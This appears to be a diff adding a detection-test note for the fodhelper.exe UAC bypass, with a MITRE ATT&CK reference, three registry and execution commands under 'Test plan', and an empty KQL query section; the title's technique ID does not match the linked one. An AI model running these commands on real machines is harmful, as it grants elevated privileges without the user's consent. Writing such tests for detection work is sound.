@@ -1,0 +1,17 @@
+Title: T1008 - Bypassing UAC via fodhelper.exe
+
+Reference: https://attack.mitre.org/techniques/T1088/
+
+Description:
+There is a way to bypass UAC via Windows 10 Features on Demand Helper (fodhelper.exe)
+
+Test plan:
+
+reg.exe add hkcu\software\classes\ms-settings\shell\open\command /ve /d "C:\Windows\System32\cmd.exe" /f
+reg.exe add hkcu\software\classes\ms-settings\shell\open\command /v "DelegateExecute" /f
+fodhelper.exe
+
+KQL Query:
+
+
+
